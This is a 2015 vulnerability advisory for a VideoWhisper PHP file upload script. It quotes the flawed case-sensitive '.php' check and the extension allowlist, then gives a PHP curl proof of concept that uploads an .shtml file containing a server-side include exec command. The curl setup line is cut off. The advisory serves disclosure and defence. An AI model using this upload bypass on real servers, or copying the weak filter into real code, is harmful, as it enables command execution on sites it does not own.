Author: Larry W. Cashdollar, @_larry0
Date: 2015-03-29
Vendor: http://www.videowhisper.com/
Vendor Notified: 2015-03-31 won’t fix, http://www.videowhisper.com/tickets_view.php?t=10019545-1427810822
Vendor Contact: http://www.videowhisper.com/tickets_submit.php
Advisory: http://www.vapid.dhs.org/advisory.php?v=117
Description: from the site
 
Vulnerability:
The
if (strstr($filename,&#039;.php&#039;)) exit;
 
can be by passed by using the extension .Php but the file extension check would allow files like test.Php.shtml
<?php
if ($_GET["room"]) $room=$_GET["room"];
if ($_POST["room"]) $room=$_POST["room"];
$filename=$_FILES[&#039;vw_file&#039;][&#039;name&#039;];
include_once("incsan.php");
sanV($room);
if (!$room) exit;
sanV($filename);
if (!$filename) exit;
if (strstr($filename,&#039;.php&#039;)) exit; //do not allow uploads to other folders
if ( strstr($room,"/") || strstr($room,"..") ) exit;
if ( strstr($filename,"/") || strstr($filename,"..") ) exit;
$destination="uploads/".$room."/“;
if ($_GET["slides"]) $destination .= "slides/“;
$ext=strtolower(substr($filename,-4)); $allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt",".pps”);
if (in_array($ext,$allowed)) move_uploaded_file($_FILES[&#039;vw_file&#039;][&#039;tmp_name&#039;], $destination . $filename);
?>loadstatus=1
CVEID: TBD
OSVDB: TBD
Exploit Code:
  videowhis_poc.php
        <?php
     
   $uploadfile="upexp.shtml";
   $ch =
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_POSTFIELDS,
            array(&#039;vw_file&#039;=>"@$uploadfile",&#039;name&#039;=>&#039;upexp.shtml&#039;,&#039;room&#039;=>&#039;.&#039;));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   $postResult = curl_exec($ch);
   curl_close($ch);
   print "$postResult";
     
   ?>
     
     
   upexp.shtml
     
   <html>
     
   <!--#exec cmd="/usr/bin/date > /tmp/p" -->
     
   this is html
   </html>
     
     

